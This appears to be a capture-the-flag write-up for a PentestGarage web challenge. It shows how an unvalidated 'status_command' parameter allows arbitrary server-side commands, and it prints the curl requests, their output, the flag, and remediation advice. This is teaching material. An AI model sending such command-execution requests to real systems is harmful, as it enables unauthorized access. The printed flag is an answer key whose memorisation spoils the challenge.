# Command Injection — PentestGarage CTF

**Category:** Web Security
**Points:** 200
**Target:** `ctf-akshay-command-injection-5ece5505.challenges.pentestgarage.com` (port 80)
**Flag:** `ctf{c0mm4nd_!nj3ct!ons_ar3_b4d}`

## Summary

A web app exposes three buttons ("Process list", "whoami", "Network Information") that
run server-side system commands. The frontend JavaScript only *appears* to restrict which
commands can be sent, but the restriction is enforced entirely client-side. Posting
directly to the backend endpoint allows arbitrary command execution.

## Recon

Fetched the homepage and noted three buttons wired up via jQuery in `/js/main.js`:

```bash
curl -s http://ctf-akshay-command-injection-5ece5505.challenges.pentestgarage.com
curl -s http://ctf-akshay-command-injection-5ece5505.challenges.pentestgarage.com/js/main.js
```

`main.js` revealed the actual request shape:

```js
$("#ps").click(function(){
  $.post("/status.php", {"status_command": "ps aux"}).done(...);
});

$("#whoami").click(function(){
  $.post("/status.php", {"status_command": "whoami"}).done(...);
});

$("#ip").click(function(){
  $.post("/status.php", {"status_command": "ip addr; ss -tlpn"}).done(...);
});
```

Key finding: the endpoint is `/status.php`, and it takes a raw `status_command` POST
parameter. The JS only ever sends three fixed strings — but that's a client-side
convention, not a server-side control.

## Exploitation

Since nothing prevents sending arbitrary values to `status_command`, arbitrary
commands were executed directly (no injection operators like `;` or `&&` were
even necessary — the parameter *is* the command):

```bash
URL="http://ctf-akshay-command-injection-5ece5505.challenges.pentestgarage.com/status.php"

curl -s -X POST "$URL" -d "status_command=whoami"
# -> www-data

curl -s -X POST "$URL" -d "status_command=id"
# -> uid=33(www-data) gid=33(www-data) groups=33(www-data)

curl -s -X POST "$URL" -d "status_command=pwd"
# -> /var/www/html

curl -s -X POST "$URL" -d "status_command=ls -la /"
```

The root listing showed a `flag.txt` file at filesystem root:

```
-r--r--r--. 1 root root 32 Mar  6  2021 flag.txt
```

Retrieved it directly:

```bash
curl -s -X POST "$URL" -d "status_command=cat /flag.txt"
# -> ctf{c0mm4nd_!nj3ct!ons_ar3_b4d}
```

## Root Cause

The backend (`status.php`) passes the `status_command` POST parameter straight into
a shell execution function (e.g. PHP's `shell_exec()`, `system()`, or `exec()`)
without any validation, sanitization, or server-side allow-listing. The only
"protection" was a client-side JavaScript UI that offered a fixed set of buttons —
trivially bypassed by talking to the API directly.

## Remediation

- **Never trust client-side restrictions.** Any allow-list must be enforced server-side.
- **Avoid shelling out** to OS commands based on user input entirely where possible;
  use language-native APIs instead (e.g. a PHP process-listing library instead of `ps aux`).
- If shelling out is unavoidable, use a strict server-side allow-list mapping a small
  set of opaque action identifiers (e.g. `"ps"`, `"whoami"`, `"ip"`) to hardcoded,
  non-user-controlled commands — never concatenate user input into the command string.
- Run backend services with least-privilege accounts and restrict filesystem
  permissions so sensitive files aren't world-readable at predictable paths.

## Timeline / Commands Used

```bash
# 1. Recon
curl -s http://ctf-akshay-command-injection-5ece5505.challenges.pentestgarage.com
curl -s http://ctf-akshay-command-injection-5ece5505.challenges.pentestgarage.com/js/main.js

# 2. Confirm raw command execution
curl -s -X POST "$URL" -d "status_command=whoami"

# 3. Enumerate filesystem
curl -s -X POST "$URL" -d "status_command=ls -la /"

# 4. Retrieve flag
curl -s -X POST "$URL" -d "status_command=cat /flag.txt"
```
